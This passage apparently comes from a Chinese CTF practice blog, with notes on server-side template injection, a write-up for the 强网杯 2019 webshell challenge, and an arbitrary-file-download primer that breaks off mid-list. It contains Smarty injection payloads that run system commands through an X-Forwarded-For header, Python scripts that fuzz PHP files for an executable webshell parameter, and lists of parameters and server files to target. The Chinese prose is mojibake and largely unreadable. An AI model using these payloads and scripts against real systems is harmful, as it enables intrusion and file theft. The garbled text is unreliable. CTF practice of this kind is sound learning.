æ¨¡æ¿å¼•æ“å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ä¸æ­¤åŒæ—¶ï¼Œå®ƒä¹Ÿæ‰©å±•äº†é»‘å®¢çš„æ”»å‡»é¢ã€‚é™¤äº†å¸¸è§„çš„ XSS å¤–ï¼Œæ³¨å…¥åˆ°æ¨¡æ¿ä¸­çš„ä»£ç è¿˜æœ‰å¯èƒ½å¼•å‘ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™ç±»é—®é¢˜ä¼šåœ¨åšå®¢ï¼ŒCMSï¼Œwiki ä¸­äº§ç”Ÿã€‚è™½ç„¶æ¨¡æ¿å¼•æ“ä¼šæä¾›æ²™ç®±æœºåˆ¶ï¼Œæ”»å‡»è€…ä¾ç„¶æœ‰è®¸å¤šæ‰‹æ®µç»•è¿‡å®ƒã€‚
</code></pre>
<h2 id="#æ¨¡æ¿æ¸²æŸ“">02 æ¨¡æ¿æ¸²æŸ“</h2>
<p>é¦–å…ˆ æ¨¡æ¿æ¸²æŸ“åˆ†è§£ä¸ºå‰ç«¯æ¸²æŸ“å’Œåç«¯æ¸²æŸ“ï¼Œè¿˜æœ‰æµè§ˆå™¨æ¸²æŸ“ã€‚</p>
<p>æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚<br>
é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚</p>
<h2 id="#æœåŠ¡ç«¯æ¨¡ç‰ˆæ³¨å…¥">03 æœåŠ¡ç«¯æ¨¡ç‰ˆæ³¨å…¥</h2>
<p>æœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ è¿‡å»çš„æ•°æ®ã€‚æ¯å½“æœåŠ¡å™¨ç”¨æ¨¡æ¿å¼•æ“è§£æç”¨æˆ·çš„è¾“å…¥æ—¶ï¼Œè¿™ç±»é—®é¢˜éƒ½æœ‰å¯èƒ½å‘ç”Ÿã€‚é™¤äº†å¸¸è§„çš„è¾“å…¥å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡ LFIï¼ˆæ–‡ä»¶åŒ…å«ï¼‰è§¦å‘å®ƒã€‚æ¨¡æ¿æ³¨å…¥å’Œ SQL æ³¨å…¥çš„äº§ç”ŸåŸå› æœ‰å‡ åˆ†ç›¸ä¼¼â€”â€”éƒ½æ˜¯å°†æœªè¿‡æ»¤çš„æ•°æ®ä¼ ç»™å¼•æ“è§£æã€‚</p>
<pre><code>è¿™é‡Œæ¨¡æ¿æ³¨å…¥å‰åŠ â€œæœåŠ¡ç«¯â€ï¼Œè¿™æ˜¯ä¸ºäº†å’Œ jQueryï¼ŒKnockoutJS äº§ç”Ÿçš„å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥åŒºåˆ«å¼€æ¥ã€‚é€šå¸¸çš„æ¥è®²ï¼Œå‰è€…ç”šè‡³å¯ä»¥è®©æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç ï¼Œè€Œåè€…åªèƒ½ XSSã€‚
</code></pre>
<h2 id="#æ¨¡æ¿å¼•æ“æ³¨å…¥">04 æ¨¡æ¿å¼•æ“æ³¨å…¥</h2>
<p>ä¸€äº›æ¨¡æ¿å¼•æ“ï¼šSmartyï¼ŒMakoï¼ŒJinja2ï¼ŒJadeï¼ŒVelocityï¼ŒFreemakerå’ŒTwigï¼Œæ¨¡æ¿æ³¨å…¥æ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå¯ä»¥äº§ç”Ÿä¸€äº›ç‰¹åˆ«æœ‰è¶£çš„å½±å“ã€‚å¯¹äºAngularJSçš„æƒ…å†µï¼Œè¿™å¯èƒ½æ„å‘³ç€XSSï¼Œå¹¶ä¸”åœ¨æœåŠ¡å™¨ç«¯æ³¨å…¥çš„æƒ…å†µä¸‹å¯èƒ½æ„å‘³ç€è¿œç¨‹ä»£ç æ‰§è¡Œã€‚é‡ç‚¹æ¥äº†ï¼Œä¸åŒå¼•æ“æœ‰ä¸åŒçš„æµ‹è¯•ä»¥åŠæ³¨å…¥æ–¹å¼ï¼</p>
<p><strong>flask/jinja2æ¨¡æ¿æ³¨å…¥</strong></p>
<p><strong>PHP/æ¨¡ç‰ˆå¼•æ“Twigæ³¨å…¥</strong></p>
<h2 id="#tplmap">05 tplmap</h2>
<p>åˆ©ç”¨tplmapè¿™ä¸ªå·¥å…·è¿›è¡Œæ£€æµ‹æ˜¯å¦æœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œç”¨æ³•æœ‰ç‚¹åƒsqlmap,éƒ½æ˜¯åŸºäºpythonçš„ã€‚</p>
<h2>06 é¢˜ç›®</h2>

<p>æŸ¥çœ‹æºç ï¼š<br><img src="/2021/04/06/ssti/2.png"><br>å‘ç°é‡Œé¢æœ‰flag.phpæ–‡ä»¶ï¼Œæ‰“å¼€åç•Œé¢å¦‚ä¸‹:<br><img src="/2021/04/06/ssti/3.png"><br>å­˜åœ¨ipåœ°å€ï¼ŒbpæŠ“åŒ…ï¼Œæ‰§è¡Œå¦‚ä¸‹payloadï¼ˆsmartyæ¨¡æ¿æ³¨å…¥ï¼‰ï¼š</p>
<pre><code>X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
</code></pre>
<p>å¾—åˆ°flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-daima" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/04/05/daima/" class="article-date">
      <time datetime="2021-04-05T07:08:52.000Z" itemprop="datePublished">2021-04-05</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/04/05/daima/">buuç»ƒä¹ [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>æ‰“å¼€é¢˜ç›®é“¾æ¥ï¼Œå¦‚ä¸‹ï¼š<br><img src="/2021/04/05/daima/2.png"><br>ä¸‹è½½æ–‡ä»¶ï¼š<br><img src="/2021/04/05/daima/1.png"><br>å¥½å®¶ä¼™ï¼Œè¿™ä¹ˆå¤šä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹å®Œæˆ‘ä»£ç å®¡è®¡åº”è¯¥ä¹Ÿå°±æ²¡å•¥é—®é¢˜äº†=|=|| <img src="/2021/04/05/daima/3.jpg"><br>è¿™ä¹ˆå¤šçš„æ–‡ä»¶å…¶å®å°±æ˜¯æ ¹æ®ä¸€å¥è¯æœ¨ğŸçš„åŸç†ï¼Œåœ¨å¤§æ‰¹é‡çš„æ–‡ä»¶ä¸­æ‰¾åˆ°ä½ æœ€ä¸­æ„çš„é‚£ä¸ªPHPé¢„å®šä¹‰å˜é‡$_GETæˆ–è€…$_POST.<br>emmmæˆ‘æ— èƒ½äº†ï¼ŒæŸ¥çœ‹å¤§ä½¬çš„wpï¼Œäººå®¶æ˜¯è¿™æ ·æ­£åˆ™çš„ï¼š<br><code>get:$_GET[\â€˜(\w+)\â€˜]</code><br><code>post:$_POST[\â€˜(\w+)\â€˜]</code><br>flag.txtå­˜å¯¹åº”çš„phpå’Œå‚æ•°ä¿¡æ¯<br>äººå®¶çš„ä»£ç æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="prism language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;å¼€å§‹æ—¶é—´&#xff1a;  &#39;</span><span class="token operator">&#43;</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
s1<span class="token operator">&#61;</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                                            <span class="token comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span>
filePath <span class="token operator">&#61;</span> r<span class="token string">&#34;D:/soft/phpstudy/PHPTutorial/WWW/src/&#34;</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>                                                    <span class="token comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">&#61;</span> <span class="token number">5</span>                                <span class="token comment">#è®¾ç½®é‡è¿æ¬¡æ•°&#xff0c;é˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜&#xff0c;æ–­å¼€è¿æ¥</span>
files <span class="token operator">&#61;</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>
session <span class="token operator">&#61;</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">&#61;</span> <span class="token boolean">False</span>                                             <span class="token comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span>
<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;trying   &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span> <span class="token string">&#39;     &#39;</span><span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">&#61;</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                            <span class="token comment">#æ‰“å¼€phpæ–‡ä»¶&#xff0c;æå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span>
            gets <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            posts <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#æ‰€æœ‰çš„$_POST</span>
    params <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#æ‰€æœ‰çš„$_GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
    url <span class="token operator">&#61;</span> <span class="token string">&#39;http://127.0.0.1/src/&#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span>
    req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span>data<span class="token punctuation">,</span> params<span class="token operator">&#61;</span>params<span class="token punctuation">)</span>            <span class="token comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
    req<span class="token punctuation">.</span>encoding <span class="token operator">&#61;</span> <span class="token string">&#39;utf-8&#39;</span>
    content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
    <span class="token comment">#print(content)</span>
    <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                                    <span class="token comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°&#xff0c;ç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span>
        flag <span class="token operator">&#61;</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
            req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">&#43;</span><span class="token string">&#39;?%s&#61;&#39;</span><span class="token operator">%</span>a<span class="token operator">&#43;</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">)</span>
            content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
            <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">&#61;</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span><span class="token punctuation">&#123;<!-- --></span>b<span class="token punctuation">:</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
                <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">&#61;&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>                                                    <span class="token comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POST&#xff0c;å¦‚æœæ˜¯GET&#xff0c;flag&#61;&#61;1&#xff0c;åˆ™bæœªå®šä¹‰&#xff1b;å¦‚æœæ˜¯POST&#xff0c;flagä¸º0&#xff0c;</span>
            param <span class="token operator">&#61;</span> a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">&#61;</span> b
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶&#xff1a; &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span><span class="token string">&#34;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°&#xff1a;%s&#34;</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;ç»“æŸæ—¶é—´&#xff1a;  &#39;</span> <span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                            <span class="token comment">#åŠ å…¥å¤šçº¿ç¨‹</span>
   t <span class="token operator">&#61;</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">&#61;</span>get_content<span class="token punctuation">,</span> args<span class="token operator">&#61;</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>emmmmm å…¶å®çœ‹åŠå¤©ä¹Ÿæ²¡çœ‹å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œè¿™ä¸ªè„šæœ¬å¤§æ¦‚å››åˆ†é’Ÿä¾¿å¯ä»¥æ‰¾åˆ°å‚æ•°çš„åˆ©ç”¨ç‚¹ï¼Œä¸»è¦æ˜¯å› ä¸ºè¿™ä¸ªè„šæœ¬å¾ˆå·§å¦™çš„å°†æ‰€æœ‰å‚æ•°ä¸€èµ·ä¼ å…¥è¿›å»ï¼Œå¦‚æœå‘ç°å¯ä»¥åˆ©ç”¨å†ç»†åˆ†æ‰¾å…·ä½“çš„å‚æ•°ã€‚ä¸‹å»å†ç ”ç©¶ç ”ç©¶<br>å¯¹äºè¿™é“é¢˜ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨å¦‚ä¸‹ä»£ç ï¼š</p>
<pre><code class="language-python">import requests
import os
import re
import threading
import time

requests.adapters.DEFAULT_RETRIES = 8 #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥
session = requests.Session()
session.keep_alive = False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse
sem=threading.Semaphore(30) # è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° ,åˆ«è®¾ç½®å¤ªå¤§ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šå´©çš„æŒºå‰å®³çš„ï¼Œè·‘åˆ°å…³é”®çš„çˆ†ç‚¸ï¼Œå¿ƒæ€å°±çˆ†ç‚¸äº†

url = &quot;http://7cfcd16d-dd76-4421-8906-b9c234c18daf.node3.buuoj.cn/&quot;

# ä¸‹è½½çš„æºæ–‡ä»¶è·¯å¾„,æ ¹æ®è‡ªå·±çš„è·¯å¾„ä¿®æ”¹
path = r&quot;C:\Users\lenovo\Desktop\www\src\\&quot;


rrGET = re.compile(r&quot;\$_GET\[\â€˜(\w+)\â€˜\]&quot;) #åŒ¹é…getå‚æ•°

rrPOST = re.compile(r&quot;\$_POST\[\â€˜(\w+)\â€˜\]&quot;) #åŒ¹é…postå‚æ•°

fileNames = os.listdir(path) # åˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶,ä»¥æ¯ä¸ªæ–‡ä»¶éƒ½å¼€ä¸€ä¸ªçº¿ç¨‹

flags = [] #ç”¨äºå­˜æ‰€æœ‰çš„æ³¨å…¥ç‚¹ä¿¡æ¯,ä¸‹é¢çš„flagè¡¨ç¤ºæ³¨å…¥ç‚¹çš„ä¿¡æ¯ï¼Œphpæ–‡ä»¶åå’Œå‚æ•°å

local_file = open(&quot;flag.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)

def run(fileName):
    with sem:
        file = open( path + fileName, â€˜râ€˜,encoding=â€˜utf-8â€˜ )
        content = file.read()
        print(&quot;[+]checking:%s&quot; % fileName )

        #æµ‹è¯•getçš„å‚æ•°
        for i in rrGET.findall(content):
            r = session.get( url + &quot;%s?%s=%s&quot; % (fileName,i,&quot;echo h3zh1;&quot;) )
            if &quot;h3zh1&quot; in r.text:
                flag = &quot;You Find it in GET fileName = %s and param = %s \n&quot; % ( fileName, i )
                print(flag)
                local_file.write(flag)
                #return 

        #æµ‹è¯•postçš„å‚æ•°
        #for i in rrPOST.findall(content):
        #    r = session.post( url + fileName , data = &#123; i : &quot;echo h3zh1;&quot; &#125; )
        #    if &quot;h3zh1&quot; in r.text:
        #        flag = &quot;You Find it in POST: fileName = %s and param = %s \n&quot; % ( fileName, i )
        #        print(flag)
        #        local_file.writelines(flag)

if __name__ == â€˜__main__â€˜:
    start_time = time.time() # å¼€å§‹æ—¶é—´
    print(&quot;[start]ç¨‹åºå¼€å§‹:&quot;+str(start_time))

    thread_list = []
    for fileName in fileNames:
        t = threading.Thread( target=run , args=(fileName,) )
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()

    end_time = time.time()
    local_file.close() #å…³æ–‡ä»¶
    print(&quot;[end]ç¨‹åºç»“æŸ:ç”¨æ—¶:&quot;+str(end_time-start_time))
</code></pre>
<p>ç„¶åå°±å¯ä»¥çŸ¥é“ï¼š<br><img src="/2021/04/05/daima/4.png"><br>è®¿é—®<br><code>url+/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code><br>å°±å¯ä»¥å¾—åˆ°flag.<br><img src="/2021/04/05/daima/6.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-b" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/04/01/b/" class="article-date">
      <time datetime="2021-04-01T05:15:46.000Z" itemprop="datePublished">2021-04-01</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/04/01/b/">ä»»æ„ä¸‹è½½æ¼æ´&amp;&amp;[RoarCTF 2019]Easy Java 1</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2>çŸ¥è¯†ç‚¹(ä»»æ„ä¸‹è½½æ¼æ´)<h2>


<p><b style="color:pink">ä»»æ„ä¸‹è½½æ¼æ´ç®€ä»‹</b><br>ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œå¾ˆå¤šç½‘ç«™å¾€å¾€éœ€è¦æä¾›æ–‡ä»¶(é™„ä»¶)ä¸‹è½½çš„åŠŸèƒ½å—ï¼Œä½†æ˜¯å¦‚æœå¯¹ä¸‹è½½çš„æ–‡ä»¶æ²¡æœ‰åšé™åˆ¶ï¼Œç›´æ¥é€šè¿‡ç»å¯¹è·¯å¾„å¯¹å…¶æ–‡ä»¶è¿›è¡Œä¸‹è½½ï¼Œé‚£ä¹ˆï¼Œæ¶æ„ç”¨æˆ·å°±å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼ä¸‹è½½æœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶ï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œè¿›ä¸€æ­¥çš„å¨èƒå’Œæ”»å‡»ã€‚</p>
<p><b style="color:pink">ä»»æ„ä¸‹è½½æ¼æ´çš„å±å®³</b><br>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥ä¸‹è½½æœåŠ¡å™¨çš„ä»»æ„æ–‡ä»¶ï¼Œwebä¸šåŠ¡çš„ä»£ç ï¼ŒæœåŠ¡å™¨å’Œç³»ç»Ÿçš„å…·ä½“é…ç½®ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼Œä»¥åŠå¯¹å†…ç½‘çš„ä¿¡æ¯æ¢æµ‹ç­‰ç­‰ã€‚<br>é€šè¿‡ä¸Šé¢çš„ç®€å•ä»‹ç»ï¼Œå¯ä»¥çœ‹å‡ºä»»æ„ä¸‹è½½æ¼æ´æ˜¯å¾ˆå¸¸è§çš„ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œå°±åˆå¯èƒ½è¢«åˆ©ç”¨ï¼Œä»è€Œé€ æˆæŸå®³ï¼Œæ¥ä¸‹æ¥å°±æ¥å­¦ä¹ ä¸‹ä»»æ„ä¸‹è½½æ¼æ´æ˜¯å¦‚ä½•åˆ©ç”¨çš„ã€‚</p>
<p><b style="color:pink">å­˜åœ¨æ–¹å¼ï¼š</b><br>ä»é“¾æ¥ä¸Šçœ‹ï¼Œå¦‚ä¸‹ä¾¿æœ‰å¯èƒ½å­˜åœ¨ä»»æ„ä¸‹è½½æ¼æ´</p>
<ol>
<li>download.php?path=
</li><li>download.php?file=
</li><li>down.php?file=
</li><li>data.php?file=
</li><li>readfile.php?file=
</li><li>read.php?filename=
</li></ol>

<p><b style="color:pink">WEB-INFå¸¸ç”¨çš„ç›®å½•æˆ–æ–‡ä»¶</b></p>
<ol>
<li>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚
</li><li>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­
</li><li>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶
</li><li>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚
</li><li>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶
</li></ol>

<p><b style="color:pink">æ¼æ´æ€»ç»“</b><br>ä»å‚æ•°åä¸Šçœ‹ï¼Œå¤§è‡´æœ‰ï¼š</p>
<ol>
<li>&readpath=
</li><li>&filepath=
</li><li>&Path=
</li><li>&inputfile=
</li><li>&url=
</li><li>&Lang=
</li><li>&dis=
</li><li>&data=
</li><li>&readfile=
</li><li>&menu=
</li><li>META-INF=
</li><li>WEB-INF
</li></ol>

<p>è¿™äº›å‚æ•°å¯èƒ½ä¼šå‡ºç°æ¼æ´<br><b>linuxå’ŒWindowsä¸‹è½½åˆ©ç”¨æ–‡ä»¶</b><br>windows:</p>
<ol>
<li>C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
</li><li>C:\Windows\System32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶
